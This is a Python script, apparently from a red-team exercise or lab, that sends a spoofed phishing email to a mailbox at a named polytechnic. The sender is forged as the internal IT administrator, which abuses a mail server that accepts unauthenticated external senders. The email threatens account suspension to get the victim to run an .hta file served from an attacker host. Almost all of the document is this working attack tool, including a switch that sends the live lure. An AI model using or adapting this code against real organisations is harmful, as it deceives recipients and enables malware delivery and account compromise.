"""GP-0 phishing email sender (runs on Kali). Delivers the lure to the victim mailbox, spoofing the
HEADER From as the internal NP admin (hMailServer accepts this unauthenticated; only the envelope
sender must be external). usage: python3 phish_email.py [--real]
Without --real it uses a [DRILLTEST] subject so you can preview it in Thunderbird without it looking
like the live lure. With --real it sends the actual lure subject."""
import smtplib, sys
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

MAILSRV = "10.4.20.21"
TO = "RemoteIT@mail.np.local"
ENVELOPE_FROM = "it-notifications@np-mail-security.com"   # external -> no auth needed
HEADER_FROM = "NP IT Administrator <admin@mail.np.local>"  # what Thunderbird displays
LINK = "http://10.5.20.50:8080/Mailbox_Security_Update.hta"
REAL = "--real" in sys.argv

SUBJECT = ("Action required: mailbox security update" if REAL
           else "[DRILLTEST] Action required: mailbox security update")

HTML = f"""\
<html><body style="font-family:Segoe UI,Arial,sans-serif;color:#222;">
<table width="600" cellpadding="0" cellspacing="0" style="border:1px solid #ddd;">
<tr><td style="background:#002a5c;padding:16px 24px;color:#fff;font-size:18px;">
  Ngee Ann Polytechnic &mdash; IT Services</td></tr>
<tr><td style="padding:24px;">
  <p>Dear RemoteIT user,</p>
  <p>Our records show your mailbox has <b>not completed the mandatory security update</b>.
  Accounts that do not apply the update by end of day will be <b>temporarily suspended</b> and
  outgoing mail blocked.</p>
  <p>Please run the Mailbox Security Update tool to keep your account active:</p>
  <p style="text-align:center;margin:28px 0;">
    <a href="{LINK}" style="background:#c8a23c;color:#002a5c;padding:12px 28px;
       text-decoration:none;font-weight:bold;border-radius:4px;">Run Mailbox Security Update</a></p>
  <p style="font-size:12px;color:#666;">If the button does not work, copy this link into your browser:<br>{LINK}</p>
  <p>Thank you,<br>NP IT Administrator</p>
</td></tr>
<tr><td style="background:#f4f4f4;padding:12px 24px;font-size:11px;color:#888;">
  This is an automated message from NP IT Services. Please do not reply.</td></tr>
</table></body></html>"""

msg = MIMEMultipart("alternative")
msg["Subject"] = SUBJECT
msg["From"] = HEADER_FROM
msg["To"] = TO
msg.attach(MIMEText("Please run the Mailbox Security Update: " + LINK, "plain"))
msg.attach(MIMEText(HTML, "html"))

s = smtplib.SMTP(MAILSRV, 25, timeout=20)
s.ehlo()
s.sendmail(ENVELOPE_FROM, [TO], msg.as_string())
s.quit()
print(f"sent ({'REAL lure' if REAL else 'DRILLTEST preview'}) to {TO}, shows as {HEADER_FROM}")
